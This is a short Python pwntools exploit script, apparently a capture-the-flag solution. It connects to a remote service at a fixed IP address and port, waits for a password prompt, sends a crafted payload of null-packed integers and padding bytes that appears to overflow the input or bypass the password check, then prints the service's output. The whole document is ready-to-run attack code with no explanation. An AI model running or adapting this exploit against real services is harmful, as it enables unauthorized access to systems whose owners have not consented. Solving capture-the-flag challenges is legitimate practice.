from pwn import *


io = remote("45.76.91.112", 10051)
io.recvuntil("Enter password:")
password = p64(0) + b'A' * 36 + p32(0)
io.sendline(password)

while True:
	try:
		# use "readline" from pwntools
		line = io.recvline().decode('ascii')
		print(line)
	except:
		# could not read line => program exited
		break
io.close()

# io.interactive()